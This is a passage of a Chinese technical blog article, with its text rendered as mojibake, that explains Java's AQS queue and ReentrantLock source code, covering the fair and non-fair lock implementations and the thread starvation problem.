<span class="hljs-keyword">if</span> (compareAndSetTail(pred, node)) {
    pred.next = node;           <span class="hljs-comment">// â‘¡ åè®¾ç½®next</span>
    <span class="hljs-keyword">return</span> node;
}
</code></pre>
<p>åœ¨â‘ å’Œâ‘¡ä¹‹é—´ï¼Œå¦‚æœå‘ç”Ÿå¹¶å‘æ“ä½œï¼Œä»headå‘åéå†å¯èƒ½æ‰¾ä¸åˆ°æ–°å…¥é˜Ÿçš„èŠ‚ç‚¹ï¼Œä½†ä»tailå‘å‰éå†ä¸€å®šèƒ½æ‰¾åˆ°ã€‚</p>
<h4 data-id="heading-61">6.4 å®Œæ•´çš„åŠ é”-é‡Šæ”¾é”æµç¨‹</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant T1 as çº¿ç¨‹1
    participant T2 as çº¿ç¨‹2
    participant AQS as AQS
    
    Note over AQS: state=0, head=tail=null
    
    T1-&gt;&gt;AQS: lock() -&gt; acquire(1)
    AQS-&gt;&gt;AQS: tryAcquire(1): state 0-&gt;1
    Note over AQS: state=1, owner=T1
    AQS--&gt;&gt;T1: è·å–æˆåŠŸ
    
    T2-&gt;&gt;AQS: lock() -&gt; acquire(1)
    AQS-&gt;&gt;AQS: tryAcquire(1): å¤±è´¥
    AQS-&gt;&gt;AQS: addWaiter(EXCLUSIVE)
    Note over AQS: åˆ›å»ºheadå“¨å…µå’ŒT2èŠ‚ç‚¹
    AQS-&gt;&gt;AQS: acquireQueued()
    AQS-&gt;&gt;AQS: park(T2)
    Note over T2: é˜»å¡ç­‰å¾…
    
    T1-&gt;&gt;AQS: unlock() -&gt; release(1)
    AQS-&gt;&gt;AQS: tryRelease(1): state 1-&gt;0
    Note over AQS: state=0, owner=null
    AQS-&gt;&gt;AQS: unparkSuccessor(head)
    AQS-&gt;&gt;T2: unpark(T2)
    
    Note over T2: è¢«å”¤é†’
    T2-&gt;&gt;AQS: ç»§ç»­acquireQueuedå¾ªç¯
    AQS-&gt;&gt;AQS: tryAcquire(1): state 0-&gt;1
    Note over AQS: state=1, owner=T2
    AQS--&gt;&gt;T2: è·å–æˆåŠŸ
</code></pre>
<h2 data-id="heading-62">ç¬¬ä¸‰ç« ï¼šReentrantLock æºç æ·±åº¦å‰–æ</h2>
<h3 data-id="heading-63">1. ç±»ç»“æ„è®¾è®¡</h3>
<h4 data-id="heading-64">1.1 æ•´ä½“ç»“æ„</h4>
<p>ReentrantLocké‡‡ç”¨<strong>ç»„åˆæ¨¡å¼</strong>ï¼Œé€šè¿‡å†…éƒ¨ç±»<code>Sync</code>åŠå…¶å­ç±»å®ç°é”çš„æ ¸å¿ƒé€»è¾‘ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReentrantLock</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Lock</span>, java.io.Serializable {
    
    <span class="hljs-comment">/** åŒæ­¥å™¨ï¼Œæä¾›æ‰€æœ‰å®ç°æœºåˆ¶ */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Sync sync;
    
    <span class="hljs-comment">/** åŒæ­¥å™¨åŸºç±» */</span>
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> { ... }
    
    <span class="hljs-comment">/** éå…¬å¹³é”å®ç° */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NonfairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> { ... }
    
    <span class="hljs-comment">/** å…¬å¹³é”å®ç° */</span>
    <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> { ... }
    
    <span class="hljs-comment">// æ„é€ æ–¹æ³•</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ReentrantLock</span><span class="hljs-params">()</span> {
        sync = <span class="hljs-keyword">new</span> <span class="hljs-title class_">NonfairSync</span>();  <span class="hljs-comment">// é»˜è®¤éå…¬å¹³é”</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ReentrantLock</span><span class="hljs-params">(<span class="hljs-type">boolean</span> fair)</span> {
        sync = fair ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">FairSync</span>() : <span class="hljs-keyword">new</span> <span class="hljs-title class_">NonfairSync</span>();
    }
}
</code></pre>
<h4 data-id="heading-65">1.2 ç±»å›¾</h4>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/598b1c2cc6a64a7a93cfcf79bf0814e1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=8zhIUzPfRigb7LF7jbRldU7yeHQ%3D" alt="reentrantlock-detailed-class-diagram.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-66">1.3 è®¾è®¡äº®ç‚¹</h4>
<ol>
<li><strong>ç­–ç•¥æ¨¡å¼</strong>ï¼šé€šè¿‡<code>Sync</code>å­ç±»åˆ‡æ¢å…¬å¹³/éå…¬å¹³ç­–ç•¥</li>
<li><strong>æ¨¡æ¿æ–¹æ³•</strong>ï¼šç»§æ‰¿AQSï¼Œåªé‡å†™<code>tryAcquire</code>å’Œ<code>tryRelease</code></li>
<li><strong>ç»„åˆä¼˜äºç»§æ‰¿</strong>ï¼šReentrantLockç»„åˆSyncï¼Œè€Œéç›´æ¥ç»§æ‰¿AQS</li>
<li><strong>å†…éƒ¨ç±»å°è£…</strong>ï¼šSyncç±»å¯¹å¤–ä¸å¯è§ï¼Œéšè—å®ç°ç»†èŠ‚</li>
</ol>
<hr/>
<h3 data-id="heading-67">2. SyncæŠ½è±¡ç±»</h3>
<h4 data-id="heading-68">2.1 æ ¸å¿ƒæ–¹æ³•æ¦‚è§ˆ</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
    
    <span class="hljs-comment">/** è·å–é”ï¼Œç”±å­ç±»å®ç°ä¸åŒç­–ç•¥ */</span>
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span>;
    
    <span class="hljs-comment">/** éå…¬å¹³tryAcquireï¼Œå…¬å¹³é”å’Œéå…¬å¹³é”çš„tryLock()éƒ½ç”¨å®ƒ */</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">nonfairTryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> { ... }
    
    <span class="hljs-comment">/** é‡Šæ”¾é”ï¼Œå…¬å¹³å’Œéå…¬å¹³é€»è¾‘ç›¸åŒ */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> { ... }
    
    <span class="hljs-comment">/** åˆ¤æ–­å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é” */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHeldExclusively</span><span class="hljs-params">()</span> { ... }
    
    <span class="hljs-comment">/** åˆ›å»ºæ¡ä»¶å˜é‡ */</span>
    <span class="hljs-keyword">final</span> ConditionObject <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span> { ... }
    
    <span class="hljs-comment">// è¾…åŠ©æ–¹æ³•</span>
    <span class="hljs-keyword">final</span> Thread <span class="hljs-title function_">getOwner</span><span class="hljs-params">()</span> { ... }
    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getHoldCount</span><span class="hljs-params">()</span> { ... }
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLocked</span><span class="hljs-params">()</span> { ... }
}
</code></pre>
<h4 data-id="heading-69">2.2 nonfairTryAcquire - éå…¬å¹³è·å–é”</h4>
<p>è¿™æ˜¯ReentrantLockçš„æ ¸å¿ƒæ–¹æ³•ï¼Œå®ç°äº†éå…¬å¹³çš„é”è·å–é€»è¾‘ã€‚å…¬å¹³é”å’Œéå…¬å¹³é”çš„<code>tryLock()</code>æ–¹æ³•éƒ½ä¼šè°ƒç”¨å®ƒï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * éå…¬å¹³åœ°å°è¯•è·å–é”
 * <span class="hljs-doctag">@param</span> acquires è·å–æ•°é‡ï¼ˆé€šå¸¸ä¸º1ï¼‰
 * <span class="hljs-doctag">@return</span> æ˜¯å¦è·å–æˆåŠŸ
 */</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">nonfairTryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
    
    <span class="hljs-comment">// â‘  é”ç©ºé—²</span>
    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// ç›´æ¥CASå°è¯•è·å–ï¼Œä¸æ£€æŸ¥é˜Ÿåˆ—ï¼ˆéå…¬å¹³ï¼‰</span>
        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, acquires)) {
            setExclusiveOwnerThread(current);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
    }
    <span class="hljs-comment">// â‘¡ å½“å‰çº¿ç¨‹å·²æŒæœ‰é”ï¼ˆé‡å…¥ï¼‰</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (current == getExclusiveOwnerThread()) {
        <span class="hljs-type">int</span> <span class="hljs-variable">nextc</span> <span class="hljs-operator">=</span> c + acquires;
        <span class="hljs-comment">// æº¢å‡ºæ£€æŸ¥ï¼ˆæœ€å¤§é‡å…¥æ¬¡æ•°çº¦21äº¿ï¼‰</span>
        <span class="hljs-keyword">if</span> (nextc &lt; <span class="hljs-number">0</span>)
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum lock count exceeded"</span>);
        setState(nextc);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    
    <span class="hljs-comment">// â‘¢ é”è¢«å…¶ä»–çº¿ç¨‹æŒæœ‰</span>
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹</strong>ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/14e49893513c4eaeb61bce7153ab3e0c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6ZWc6Iqx5rC05pyIbGlueWk=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765767298&amp;x-signature=fxChheAr6lOFmI4c4vo5NiL5sW0%3D" alt="nonfairTryAcquire-flow.drawio.png" loading="lazy"/></p>
<h4 data-id="heading-70">2.3 tryRelease - é‡Šæ”¾é”</h4>
<p>å…¬å¹³é”å’Œéå…¬å¹³é”çš„é‡Šæ”¾é€»è¾‘å®Œå…¨ç›¸åŒï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å°è¯•é‡Šæ”¾é”
 * <span class="hljs-doctag">@param</span> releases é‡Šæ”¾æ•°é‡ï¼ˆé€šå¸¸ä¸º1ï¼‰
 * <span class="hljs-doctag">@return</span> æ˜¯å¦å®Œå…¨é‡Šæ”¾ï¼ˆstateå˜ä¸º0ï¼‰
 */</span>
<span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState() - releases;
    
    <span class="hljs-comment">// â‘  åªæœ‰é”æŒæœ‰è€…æ‰èƒ½é‡Šæ”¾</span>
    <span class="hljs-keyword">if</span> (Thread.currentThread() != getExclusiveOwnerThread())
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
    
    <span class="hljs-type">boolean</span> <span class="hljs-variable">free</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// â‘¡ stateå‡åˆ°0ï¼Œå®Œå…¨é‡Šæ”¾</span>
    <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
        free = <span class="hljs-literal">true</span>;
        setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
    }
    
    <span class="hljs-comment">// â‘¢ æ›´æ–°stateï¼ˆæ— éœ€CASï¼Œå› ä¸ºæ˜¯ç‹¬å çš„ï¼‰</span>
    setState(c);
    <span class="hljs-keyword">return</span> free;
}
</code></pre>
<p><strong>å…³é”®ç‚¹</strong>ï¼š</p>
<ul>
<li>åªæœ‰<code>state==0</code>æ—¶æ‰çœŸæ­£é‡Šæ”¾é”ï¼ˆè¿”å›trueï¼‰</li>
<li>é‡å…¥åœºæ™¯ä¸‹ï¼Œæ¯æ¬¡unlockåªå°†stateå‡1</li>
<li>ä¸éœ€è¦CASï¼Œå› ä¸ºåªæœ‰é”æŒæœ‰è€…æ‰èƒ½è°ƒç”¨</li>
</ul>
<h4 data-id="heading-71">2.4 isHeldExclusively - æ˜¯å¦ç‹¬å æŒæœ‰</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHeldExclusively</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> getExclusiveOwnerThread() == Thread.currentThread();
}
</code></pre>
<p>è¿™ä¸ªæ–¹æ³•è¢«<code>Condition</code>ä½¿ç”¨ï¼Œç”¨äºåœ¨<code>await()</code>å’Œ<code>signal()</code>æ—¶æ£€æŸ¥å½“å‰çº¿ç¨‹æ˜¯å¦æŒæœ‰é”ã€‚</p>
<h4 data-id="heading-72">2.5 è¾…åŠ©æ–¹æ³•</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–é”çš„æŒæœ‰è€…</span>
<span class="hljs-keyword">final</span> Thread <span class="hljs-title function_">getOwner</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> getState() == <span class="hljs-number">0</span> ? <span class="hljs-literal">null</span> : getExclusiveOwnerThread();
}

<span class="hljs-comment">// è·å–å½“å‰çº¿ç¨‹çš„é‡å…¥æ¬¡æ•°</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getHoldCount</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> isHeldExclusively() ? getState() : <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// åˆ¤æ–­é”æ˜¯å¦è¢«ä»»ä½•çº¿ç¨‹æŒæœ‰</span>
<span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLocked</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> getState() != <span class="hljs-number">0</span>;
}

<span class="hljs-comment">// åˆ›å»ºæ¡ä»¶å˜é‡</span>
<span class="hljs-keyword">final</span> ConditionObject <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionObject</span>();
}
</code></pre>
<hr/>
<h3 data-id="heading-73">3. éå…¬å¹³é”NonfairSync</h3>
<h4 data-id="heading-74">3.1 å®Œæ•´æºç </h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * éå…¬å¹³é”çš„åŒæ­¥å™¨
 */</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NonfairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">7316153563782823691L</span>;

    <span class="hljs-comment">/**
     * è·å–é”
     * éå…¬å¹³é”çš„ç‰¹ç‚¹ï¼šå…ˆå°è¯•æ’é˜Ÿï¼Œå¤±è´¥å†æ’é˜Ÿ
     */</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// â‘  ç›´æ¥å°è¯•CASè·å–é”ï¼ˆæ’é˜Ÿï¼‰</span>
        <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>))
            setExclusiveOwnerThread(Thread.currentThread());
        <span class="hljs-keyword">else</span>
            <span class="hljs-comment">// â‘¡ æ’é˜Ÿå¤±è´¥ï¼Œèµ°æ ‡å‡†è·å–æµç¨‹</span>
            acquire(<span class="hljs-number">1</span>);
    }

    <span class="hljs-comment">/**
     * å°è¯•è·å–é”ï¼ˆéå…¬å¹³ç‰ˆæœ¬ï¼‰
     */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
        <span class="hljs-keyword">return</span> nonfairTryAcquire(acquires);
    }
}
</code></pre>
<h4 data-id="heading-75">3.2 éå…¬å¹³é”çš„"æ’é˜Ÿ"æœºåˆ¶</h4>
<p>éå…¬å¹³é”æœ‰<strong>ä¸¤æ¬¡æ’é˜Ÿæœºä¼š</strong>ï¼š</p>
<pre><code class="hljs language-mermaid" lang="mermaid">sequenceDiagram
    participant T as æ–°çº¿ç¨‹
    participant AQS as AQS
    participant Q as ç­‰å¾…é˜Ÿåˆ—
    
    Note over T: è°ƒç”¨lock()
    
    T-&gt;&gt;AQS: â‘  ç¬¬ä¸€æ¬¡æ’é˜Ÿï¼šCAS(0-&gt;1)
    alt CASæˆåŠŸ
        AQS--&gt;&gt;T: è·å–æˆåŠŸï¼ˆæ’é˜ŸæˆåŠŸï¼‰
    else CASå¤±è´¥
        T-&gt;&gt;AQS: acquire(1)
        T-&gt;&gt;AQS: â‘¡ ç¬¬äºŒæ¬¡æ’é˜Ÿï¼štryAcquire
        alt tryAcquireæˆåŠŸ
            AQS--&gt;&gt;T: è·å–æˆåŠŸï¼ˆæ’é˜ŸæˆåŠŸï¼‰
        else tryAcquireå¤±è´¥
            T-&gt;&gt;Q: å…¥é˜Ÿç­‰å¾…
            Note over T: è€å®æ’é˜Ÿ
        end
    end
</code></pre>
<p><strong>ç¬¬ä¸€æ¬¡æ’é˜Ÿ</strong>ï¼šåœ¨<code>lock()</code>æ–¹æ³•ä¸­ç›´æ¥CAS</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>))
    setExclusiveOwnerThread(Thread.currentThread());
</code></pre>
<p><strong>ç¬¬äºŒæ¬¡æ’é˜Ÿ</strong>ï¼šåœ¨<code>acquire()</code>ä¸­è°ƒç”¨<code>tryAcquire()</code></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// AQS.acquire</span>
<span class="hljs-keyword">if</span> (!tryAcquire(arg) &amp;&amp; ...)
</code></pre>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆéå…¬å¹³é”å¯èƒ½å¯¼è‡´ç­‰å¾…çº¿ç¨‹"é¥¥é¥¿"â€”â€”æ–°æ¥çš„çº¿ç¨‹å¯èƒ½æŠ¢åœ¨ç­‰å¾…é˜Ÿåˆ—å‰é¢è·å–é”ã€‚</p>
<hr/>
<h4 data-id="heading-76">3.3 éå…¬å¹³é”çš„é¥¥é¥¿é—®é¢˜</h4>
<h5 data-id="heading-77">3.3.1 ä»€ä¹ˆæ˜¯çº¿ç¨‹é¥¥é¥¿</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * éå…¬å¹³é”å¯èƒ½å¯¼è‡´çº¿ç¨‹é¥¥é¥¿
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadStarvation</span> {
    
    <span class="hljs-comment">// éå…¬å¹³é”ï¼ˆé»˜è®¤ï¼‰</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">unfairLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">false</span>);
    
    <span class="hljs-comment">/**
     * åœºæ™¯ï¼šçº¿ç¨‹AæŒæœ‰é”å¾ˆé•¿æ—¶é—´
     * çº¿ç¨‹Bã€Cã€D...éƒ½åœ¨ç­‰å¾…
     * çº¿ç¨‹Aé‡Šæ”¾åï¼Œå¦‚æœæ–°æ¥çš„çº¿ç¨‹EæŠ¢åˆ°äº†é”
     * Bã€Cã€Dç»§ç»­ç­‰å¾…...
     * 
     * æç«¯æƒ…å†µä¸‹ï¼ŒBå¯èƒ½ä¸€ç›´è·å–ä¸åˆ°é”
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">potentialStarvation</span><span class="hljs-params">()</span> {
        unfairLock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// é•¿æ—¶é—´æ“ä½œ</span>
            Thread.sleep(<span class="hljs-number">1000</span>);
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
        } <span class="hljs-keyword">finally</span> {
            unfairLock.unlock();
        }
    }
}
</code></pre>
<h5 data-id="heading-78">3.3.2 å¦‚ä½•è§£å†³é¥¥é¥¿é—®é¢˜</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * è§£å†³é¥¥é¥¿é—®é¢˜çš„æ–¹æ¡ˆ
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StarvationSolution</span> {
    
    <span class="hljs-comment">// æ–¹æ¡ˆ1ï¼šä½¿ç”¨å…¬å¹³é”</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">fairLock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>(<span class="hljs-literal">true</span>);
    
    <span class="hljs-comment">// æ–¹æ¡ˆ2ï¼šå‡å°‘é”æŒæœ‰æ—¶é—´</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reduceHoldTime</span><span class="hljs-params">()</span> {
        lock.lock();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// åªåšå¿…è¦æ“ä½œ</span>
            quickOperation();
        } <span class="hljs-keyword">finally</span> {
            lock.unlock();
        }
        <span class="hljs-comment">// è€—æ—¶æ“ä½œæ”¾åœ¨é”å¤–</span>
        slowOperation();
    }
    
    <span class="hljs-comment">// æ–¹æ¡ˆ3ï¼šä½¿ç”¨tryLockè¶…æ—¶</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">withTimeout</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">if</span> (lock.tryLock(<span class="hljs-number">100</span>, TimeUnit.MILLISECONDS)) {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘</span>
                } <span class="hljs-keyword">finally</span> {
                    lock.unlock();
                }
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// è¶…æ—¶å¤„ç†ï¼Œè€Œä¸æ˜¯æ— é™ç­‰å¾…</span>
                handleTimeout();
            }
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">quickOperation</span><span class="hljs-params">()</span> {}
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">slowOperation</span><span class="hljs-params">()</span> {}
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handleTimeout</span><span class="hljs-params">()</span> {}
}
</code></pre>
<h5 data-id="heading-79">3.3.3 ä¸ºä»€ä¹ˆè¿˜è¦ä½¿ç”¨éå…¬å¹³é”</h5>
<p>å°½ç®¡å¯èƒ½é€ æˆé¥¥é¥¿ï¼Œéå…¬å¹³é”ä»æ˜¯é»˜è®¤é€‰æ‹©ï¼š</p>






























<table><thead><tr><th align="left">æ–¹é¢</th><th align="left">å…¬å¹³é”</th><th align="left">éå…¬å¹³é”</th></tr></thead><tbody><tr><td align="left">çº¿ç¨‹é¥¥é¥¿</td><td align="left">ä¸ä¼š</td><td align="left">å¯èƒ½</td></tr><tr><td align="left">ååé‡</td><td align="left">è¾ƒä½</td><td align="left">è¾ƒé«˜</td></tr><tr><td align="left">ä¸Šä¸‹æ–‡åˆ‡æ¢</td><td align="left">å¤š</td><td align="left">å°‘</td></tr><tr><td align="left">é€‚ç”¨åœºæ™¯</td><td align="left">é¡ºåºé‡è¦</td><td align="left">æ€§èƒ½é‡è¦</td></tr></tbody></table>
<p><strong>å¤§å¤šæ•°åœºæ™¯ä¸‹</strong>ï¼Œé¥¥é¥¿é—®é¢˜å‘ç”Ÿçš„æ¦‚ç‡å¾ˆä½ï¼Œéå…¬å¹³é”çš„æ€§èƒ½ä¼˜åŠ¿æ›´é‡è¦ã€‚</p>
<h3 data-id="heading-80">4. å…¬å¹³é”FairSync</h3>
<h4 data-id="heading-81">4.1 å®Œæ•´æºç </h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * å…¬å¹³é”çš„åŒæ­¥å™¨
 */</span>
<span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FairSync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Sync</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> -<span class="hljs-number">3000897897090466540L</span>;

    <span class="hljs-comment">/**
     * è·å–é”
     * å…¬å¹³é”çš„ç‰¹ç‚¹ï¼šä¸æ’é˜Ÿï¼Œç›´æ¥èµ°æ ‡å‡†æµç¨‹
     */</span>
    <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> {
        acquire(<span class="hljs-number">1</span>);  <span class="hljs-comment">// æ²¡æœ‰æ’é˜Ÿï¼Œç›´æ¥acquire</span>
    }

    <span class="hljs-comment">/**
     * å°è¯•è·å–é”ï¼ˆå…¬å¹³ç‰ˆæœ¬ï¼‰
     * ä¸éå…¬å¹³ç‰ˆæœ¬çš„å”¯ä¸€åŒºåˆ«ï¼šæ£€æŸ¥æ˜¯å¦æœ‰å‰é©±ç­‰å¾…è€…
     */</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
        <span class="hljs-keyword">final</span> <span class="hljs-type">Thread</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> Thread.currentThread();
        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> getState();
        
        <span class="hljs-keyword">if</span> (c == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// å…³é”®åŒºåˆ«ï¼šå…ˆæ£€æŸ¥é˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰ç­‰å¾…è€…</span>
            <span class="hljs-keyword">if</span> (!hasQueuedPredecessors() &amp;&amp;
                compareAndSetState(<span class="hljs-number">0</span>, acquires)) {
                setExclusiveOwnerThread(current);
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
        }
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (current == getExclusiveOwnerThread()) {
            <span class="hljs-comment">// é‡å…¥é€»è¾‘ä¸éå…¬å¹³é”ç›¸åŒ</span>
